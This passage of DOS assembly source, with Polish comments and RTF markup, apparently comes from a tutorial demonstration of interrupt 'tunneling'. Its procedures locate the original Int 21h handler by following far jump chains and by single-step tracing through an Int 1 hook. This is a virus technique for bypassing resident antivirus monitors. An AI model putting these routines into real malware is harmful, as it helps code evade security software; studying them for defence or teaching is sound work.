\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            mov  ShowSeg,es              ; przepisz segment i offset}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            mov  ShowOfs,bx              ; potrzebne do wyswietlenia adresu}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch LookUpTable21_Exit:                     ; skacz tu, gdy jakis blad}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            pop  si}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            pop  bx                      ; \\}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            pop  ax                      ;  - przywroc zmieniane rejeetry}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            pop  es                      ; /}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            ret                          ; powrot z procedury}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch LookUpTable21 endp}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Recursive21 proc near}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            push es                      ; \\}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            push ds                      ;  \\}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            push ax                      ;   \\  zachowaj zmieniane rejestry}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            push bx                      ;   /}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            push si                      ;  /}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            push di                      ; /}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            lea  si,TeRecursive21        ; \\ wyswietl info o metodzie}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            Call Print                   ; /}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            mov  ShowError, offset TeRecursive21Fail}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                         ; ewentualny komunikat o bledzie}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            xor  ax,ax                   ; \\ zeruj zmienne pomocnicze}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            mov  ShowSeg,ax              ;  /}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            mov  ShowOfs,ax              ; /}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            mov  ah,52h                  ; \\ pobierz do ES:BX adres struktury}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            int  21h                     ; / LL (lista list)}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            mov  bx,es}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            xor  ax,ax                   ; ustaw adres DS:SI na adres}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            mov  ds,ax                   ; przerwania 21h wskazywanego}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            mov  si,21h*4                ; przez tablice przerwa\uc1\u324\'f1}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            xchg ax,di                   ; DI=licznik sprawdzanych bajtow=0}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch    Adres32:}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            lds     si,ds:[si]           ; pobierz adres}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            or      bx,bx                ; czy koniec szukania ?}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            jz      WSegmencieDOS        ; TAK - powrot DS:SI=adres}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            mov     ax,ds                ; \\ czy jest to segment DOS ?}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            cmp     ax,bx                ; /}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            jne NastepnyBajt             ; TAK - znaleziony adres}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            xor     bx,bx                ; BX=0 oznacza koniec szukania}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch    NastepnyBajt:}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            lodsw                        ; wez 2 bajty bedace czescia}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                         ; aktualnej procedury}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            dec     si                   ; sprawdzamy co bajt}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            cmp     al,9Ah               ; czy jest to CALL FAR PTR ?}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            je      Adres32              ; TAK - wez kolejny adres}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            cmp     al,0EAh              ; czy jest to JMP FAR PTR ?}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            je      Adres32              ; TAK - wez kolejny adres}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            cmp     ax,0FF2Eh            ; czy jest to JMP FAR CS:DWORD ?}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            jne     NieJMP_DWORD         ;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            cmp     byte ptr [si+1],al   ; czy dalsza czesc rozkazu JMP FAR CS:DWORD ?}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            jne     NieJMP_DWORD         ;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            mov     si,ds:[si+2]         ; pobierz ofset do danych dla skoku}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            jmp     short Adres32        ; TAK - wez kolejny adres}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch NieJMP_DWORD:}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            inc     DI                   ; licznik sprawdzanych bajtow}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            and     DI,4095              ; jezeli sprawdzono juz > 4095 bajtow,}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            je      Recursive21_Exit     ; to koncz, bo tuneling nie dziala}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            jmp  NastepnyBajt            ; wez kolejny bajt}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch WSegmencieDOS:}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                         ; adres zostal znaleziony (jest w DS:SI)}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            mov  cs:ShowSeg,ds           ; przepisz segment i offset}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            mov  cs:ShowOfs,si           ; potrzebne do wyswietlenia adresu}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Recursive21_Exit:                       ; skacz tu, gdy jakis blad}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            pop  di                      ; \\}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            pop  si                      ;  \\}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            pop  bx                      ;   \\ przywroc zmieniane rejeetry}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            pop  ax                      ;   /}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            pop  ds                      ;  /}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            pop  es                      ; /}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            ret                          ; powrot z procedury}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Recursive21 endp}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Tracing21 proc near                     ; procedura popbiera oryginalny}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                         ; adres Int 13h wykorzystujac}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                         ; metode tracingu}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            push ds                      ; \\}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            push es                      ;  \\}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            push ax                      ;   \\ zachowaj zmieniane rejestry}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            push bx                      ;    /}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            push cx                      ;   /}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            push dx                      ;  /}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            push si                      ; /}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            mov  ShowError, offset TeTracingFail}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                         ; ewentualny komunikat o bledzie}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            lea  si,TeTracing21          ; \\ wyswietl info o metodzie}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            Call Print                   ; /}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            xor  ax,ax                   ; \\ zeruj zmienne pomocnicze}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            mov  ShowSeg,ax              ;  /}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            mov  ShowOfs,ax              ; /}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            mov  ah,62h                  ; \\   pobierz info o aktualnym PSP}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            int  21h                     ;  \\  i zachowaj na pozniej te wartosc}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            mov  MagicNum1,bx            ;   / (rejestr BX) bedzie ona}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                         ;  /  potrzebna, zeby sprawdzic, czy}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                         ; /   tracer jest juz w dobrym kodzie}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            mov  ax,3521h}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            int  21h                     ; \\   wez adres przerwania Int 21h,}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            mov  CallFarSeg,es           ;  \\  zeby mozna je bylo przetrace'ow}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            mov  CallFarOfs,bx           ;  /  trzeba je emulowac poprzez}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                         ; /   pushf/call dword ptr Ofs:Seg}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            mov  TraceMode,OFF           ; flaga potrzebna dla tracera}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            mov  ax,3501h                ; \\    pobierz adres obslugi}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            int  21h                     ;  \\   przerwania krokowego Int 1}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            mov  of1,bx                  ;   \\}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            mov  se1,es                  ;    \\ i zmien je na nowa procedure}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                         ;    - obslugi, sprawdzajaca czy}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            mov  dx,offset Tracer_21     ;   /  funkcja zostala juz wykonana}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            mov  ax,2501h                ;  /   przez DOS}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            int  21h                     ; /}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            pushf                        ; \\    wlacz tryb krokowy}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            pop ax                       ;  \\   procesora}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            or ah,1                      ;   \\}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            push ax                      ;  /}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            popf                         ; /}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            mov  ah,62h                  ; numer funkcji DOS}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            pushf                        ; czesc emulacji Int 21}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            mov  TraceMode,ON            ; wlacz flage tracera}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            Call dword ptr cs:IntAsFarCall ; emuluj int 21}{\f2\fs24\lang1045{\*\listtag0}\par}
